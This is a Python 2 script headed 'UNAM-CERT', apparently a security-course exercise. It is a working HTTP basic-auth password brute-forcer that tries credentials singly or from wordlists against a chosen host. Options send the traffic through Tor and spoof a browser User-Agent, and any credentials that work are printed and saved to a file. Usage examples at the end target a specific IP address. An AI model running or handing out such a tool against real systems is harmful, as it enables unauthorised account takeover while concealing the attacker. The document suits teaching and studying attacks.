#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
import requests
from requests import get
from requests.exceptions import ConnectionError

#Sesion para TOR
session = requests.session()
session.proxies = {}

#Agregamos nuestros Proxies
session.proxies = {
'http': 'socks5://127.0.0.1:9050',
'https': 'socks5://127.0.0.1:9050'
}
#Agregamos header para cambiar el Agente de python
#headers = {}
#headers['User-agent'] : “HotJava/1.1.2 FCS”
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    #Agregamos parse
    parser.add_option('-u', '--userfile', dest='userfile', default=None, help='Archivo de usuarios.')
    parser.add_option('-w', '--passwordfile', dest='passwordfile', default=None, help='Archivo de passwords.')
    #Opcion Verbose
    parser.add_option('-v', '--verbose', action="store_true", dest='verbose', help='Muestra una descripcio de las contraseñas que va probando.')
    #Opcion para guardar los hallazgos
    parser.add_option('-f', '--file', dest='file', default=None, help='Bandera para guardar los hallazgos en un archivos.')
    #Opcion para peticiones a traves de TOR
    parser.add_option('-t', '--tor', action="store_true",dest='tor', default=None, help='Bandera para enviar las peticiones a traves de TOR.')
    #Opcion para cambiar el Agente
    parser.add_option('-a', '--agente', action="store_true",dest='agente', default=None, help='Bandera para cambiar el Agente de python.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)

#Salvar en un archivo
def checkFileSave(options,user,password):
    '''
    Funcion que valida si la opcion -f <nombre del archivo> si esta activa escribira
    en el archivo los hallazgos de la pagina web.
    Modo de uso -f <nombre_del _archivo>
    '''
    if options.file is not None:
        with open(options.file,'w') as fs:
            fs.write('%s\t%s' % (user,password))

#Para validar la opcion Verbose
def checkVerbose(options,user,password):
    '''
    Funcion que valida si la opcion -v --verbose esta activa, si lo esta
    mostrará tanto el usuario y contraseña con la cual intentara acceder a
    la página web
    Modo de uso: -v
    '''
    if options.verbose is not None:
        print "Se intentara con el usuario:  " + str(user)
        print "Se intentara con la contraseña:  " + str(password)

#Con la opción -u y -p para Usar archivos
def checkFiles(options):
    '''
    Función que valida si la opción -userfile y -passwordfile estan activa
    al mismo tiempo, tratara con cada usuario y password que encuentra en
    ambos archivos.
    Modo de uso -u <archivo_con_usuarios> -w <archivo_de_contraseñas> 
    '''
    if (options.userfile is not None and options.passwordfile is not None):
        with open('user.txt') as us:
            for linea in us:
                user = linea.strip('\n')
                #print (user)                            
                with open('password.txt') as ps:
                    for linea2 in ps:           
                        passwd = linea2.strip('\n')
                        #print (passwd)
                        if options.tor is not None:
                            makeRequestTOR(url, user, passwd)
                        else:
                            makeRequest(url, user, passwd)

def checkUserPass(options):
    '''
    Función que valida si la opción -user y -password estan activa
    al mismo tiempo, tratara con el usuario y password escritos en 
    consola.
    Modo de uso -U <usuarios> -P <contraseñas> 
    '''
    if (options.user is not None and options.password is not None):
        if options.tor is not None:
            makeRequestTOR(url, opts.user, opts.password)
        else:

            makeRequest(url, opts.user, opts.password)

def reportResults():
    pass

def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def makeRequest(host, user, password):
    checkOptions(opts)
    checkVerbose(opts,user,password)
    try:
        if opts.agente is not None:
            response = get(host, auth=(user,password),headers=headers)
        else:
            response = get(host, auth=(user,password))
            print('ip: {}'.format(response.text.strip()))
        #print response
        #print dir(response)

        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            checkFileSave(opts,user,password)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def makeRequestTOR(host, user, password):
    '''
    Funcion que envia nuestros request por TOR
    '''
    checkOptions(opts)
    checkVerbose(opts,user,password)
    try:
        if opts.agente is not None:
            response = session.get(host, auth=(user,password), headers=headers)
        else:
            response = session.get(host, auth=(user,password))
            print('tor ip: {}'.format(response.text.strip()))
            #print response
            #print dir(response)

        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            checkFileSave(opts,user,password)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        checkFiles(opts)
        checkUserPass(opts)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)

'''
Modos de uso
python T05-EjercicioReq.py -s 84.19.176.42 -U prueba -P hola123.,
python T05-EjercicioReq.py -s 84.19.176.42 -U prueba -P hola123., -v
python T05-EjercicioReq.py -s 84.19.176.42 -U prueba -P hola123., -v -f hallazgos.txt
python T05-EjercicioReq.py -s 84.19.176.42 -u user.txt -w password.txt
python T05-EjercicioReq.py -s 84.19.176.42 -u user.txt -w password.txt -v
python T05-EjercicioReq.py -s 84.19.176.42 -u user.txt -w password.txt -v -f hallazgos.txt
python T06-EjercicioReqTOR.py -s 84.19.176.42 -u user.txt -w password.txt -t
'''

